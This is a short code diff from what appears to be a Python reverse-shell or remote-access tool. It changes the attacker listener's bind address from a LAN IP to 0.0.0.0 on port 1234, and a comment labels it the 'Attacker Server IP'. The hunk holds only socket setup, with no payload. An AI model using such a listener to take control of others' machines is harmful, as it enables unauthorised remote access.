@@ -45,7 +45,7 @@ def disconnect(conn):
 def connect():
     global s
     s = socket.socket()
-    s.bind(("192.168.1.28", 1234)) # Edit here the Attacker Server IP and listening port
+    s.bind(("0.0.0.0", 1234)) # Edit here the Attacker Server IP and listening port
     s.listen(1)
     print("[*] Listening for TCP connection")
     conn, addr = s.accept()
